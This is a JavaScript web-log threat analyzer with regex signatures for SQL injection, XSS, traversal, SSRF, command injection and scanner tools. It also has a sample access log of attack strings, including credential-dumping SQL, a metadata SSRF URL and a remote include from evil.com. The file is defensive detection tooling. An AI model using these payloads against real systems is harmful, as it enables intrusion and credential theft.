const THREAT_SIGNATURES = [
    { name: "Brute Force Attempt", regex: /401|failed login|invalid password|authentication failed/i, severity: "High" },
    { name: "SQL Injection", regex: /UNION\s+SELECT|SELECT.+FROM|OR\s+'?1'?\s*=\s*'?1'?|--\s|OR\s+1=1/i, severity: "Critical" },
    { name: "Blind SQLi (time-based)", regex: /sleep\(|benchmark\(|waitfor\s+delay/i, severity: "Critical" },
    { name: "Path Traversal", regex: /\.\.\/|\.\.\\|\.\.\/\.\.\/etc\/passwd/i, severity: "High" },
    { name: "Local File Inclusion", regex: /etc\/passwd|php:\/\/filter|include_path/i, severity: "High" },
    { name: "Remote File Inclusion", regex: /https?:\/\/.+\.(php|txt|sh)/i, severity: "High" },
    { name: "Command Injection", regex: /;\s*\w|\|\||\&\&|`|cmd\.exe|wget\s+http|curl\s+http/i, severity: "Critical" },
    { name: "XSS Attempt", regex: /<script>|alert\(|onerror=|javascript:/i, severity: "Medium" },
    { name: "Directory Listing / Recon", regex: /\/?C=N;O|robots\.txt|\.git\/HEAD/i, severity: "Low" },
    { name: "SSRF", regex: /169\.254\.169\.254|localhost:5984|127\.0\.0\.1/i, severity: "High" },
    { name: "Malicious Upload", regex: /\.(php|jsp)|multipart\/form-data.*filename=/i, severity: "High" },
    { name: "Exploit Tool / Scanner", regex: /cmd\.exe|powershell\s+-|msfconsole|sqlmap/i, severity: "Critical" }
];

function loadSample() {
    const sample = `192.168.1.45 - [07/Jan/2026:10:01:02] "POST /login" 401 "Mozilla/5.0"
192.168.1.45 - [07/Jan/2026:10:01:05] "POST /login" 401 "Mozilla/5.0"
10.0.0.5 - [07/Jan/2026:10:05:12] "GET /search?id=1' OR '1'='1" 200
10.0.0.6 - [07/Jan/2026:10:06:33] "GET /product?id=1 UNION SELECT username, password FROM users" 200
203.0.113.10 - [07/Jan/2026:11:00:00] "GET /search?q=<script>alert(1)</script>" 200
172.16.0.4 - [07/Jan/2026:11:05:00] "GET /../../etc/passwd" 403
198.51.100.12 - [07/Jan/2026:12:00:00] "GET /wp-login.php" 200
198.51.100.12 - [07/Jan/2026:12:00:02] "POST /wp-login.php" 401
203.0.113.11 - [07/Jan/2026:13:00:00] "GET /?C=N;O" 200
192.0.2.2 - [07/Jan/2026:14:00:00] "GET /proxy?url=http://169.254.169.254/latest/meta-data/" 200
198.51.100.20 - [07/Jan/2026:15:00:00] "POST /upload" 200 "Content-Type: multipart/form-data; filename=\"shell.php\""
203.0.113.15 - [07/Jan/2026:16:00:00] "GET /index.php?cmd=ls -la" 500
203.0.113.20 - [07/Jan/2026:16:05:00] "GET /download?file=http://evil.com/shell.txt" 200
192.168.1.100 - [07/Jan/2026:16:10:00] "GET /search?q=') OR 1=1; --" 200
10.0.0.7 - [07/Jan/2026:16:12:00] "GET /admin/.git/HEAD" 200
10.0.0.8 - [07/Jan/2026:17:00:00] "GET /?page=../../../../etc/passwd" 403
203.0.113.25 - [07/Jan/2026:18:00:00] "GET /vulnerable?time=waitfor delay '0:0:5' --" 200
198.51.100.30 - [07/Jan/2026:19:00:00] "GET /search?q=<img src=x onerror=alert(1)>" 200
192.168.1.200 - [07/Jan/2026:20:00:00] "GET /cmd.exe /c whoami" 500`;
    document.getElementById('logInput').value = sample;
}

function escapeHtml(text) {
    return text.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
}

function analyzeLogs() {
    const logs = document.getElementById('logInput').value.split('\n').filter(l => l.trim() !== '');
    const resultsContainer = document.getElementById('resultsList');
    resultsContainer.innerHTML = "";
    let count = 0;
    const dedupe = document.getElementById('dedupe')?.checked;
    const filter = document.getElementById('severityFilter')?.value || 'All';
    const seen = new Set();
    const results = [];

    logs.forEach((line, index) => {
        THREAT_SIGNATURES.forEach(sig => {
            if (sig.regex.test(line)) {
                const key = `${sig.name}::${line.trim()}`;
                if (dedupe && seen.has(key)) return;
                seen.add(key);
                if (filter !== 'All' && sig.severity !== filter) return;
                const ip = (line.match(/(\d{1,3}(?:\.\d{1,3}){3})/)||[])[0] || 'N/A';
                const ts = (line.match(/\[(.*?)\]/)||[])[1] || '';
                results.push({ sig, index: index+1, line, ip, ts });
            }
        });
    });

    results.forEach(r => {
        count++;
        const div = document.createElement('div');
        div.className = "threat-item";
        const badgeClass = (r.sig.severity === 'Critical') ? 'badge-critical' : (r.sig.severity === 'High') ? 'badge-high' : (r.sig.severity === 'Medium') ? 'badge-medium' : 'badge-low';
        div.innerHTML = `<strong><span class="badge ${badgeClass}">${r.sig.severity}</span> ${r.sig.name}</strong>: Line ${r.index} [${r.ip}] ${r.ts ? ' ' + r.ts : ''} -> <code>${escapeHtml(r.line)}</code>`;
        resultsContainer.appendChild(div);
    });

    document.getElementById('threatCount').innerText = count;
}

function exportCSV() {
    const rows = [['Severity','Name','Line','IP','Timestamp','Content']];
    document.querySelectorAll('#resultsList .threat-item').forEach(node => {
        const text = node.innerText.replace(/\n/g, ' ');
        // crude parse: Severity at start
        const m = text.match(/^(Critical|High|Medium|Low)\s+(.*?)\: Line (\d+) \[(.*?)\] (.*?) -> (.*)$/);
        if (m) rows.push([m[1], m[2].trim(), m[3], m[4], '', m[6]]);
    });
    const csv = rows.map(r => r.map(c => '"' + String(c).replace(/"/g,'""') + '"').join(',')).join('\n');
    const blob = new Blob([csv], { type: 'text/csv' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = 'threats.csv';
    document.body.appendChild(a);
    a.click();
    a.remove();
    URL.revokeObjectURL(url);
}

function clearResults() {
    document.getElementById('resultsList').innerHTML = '';
    document.getElementById('threatCount').innerText = '0';
}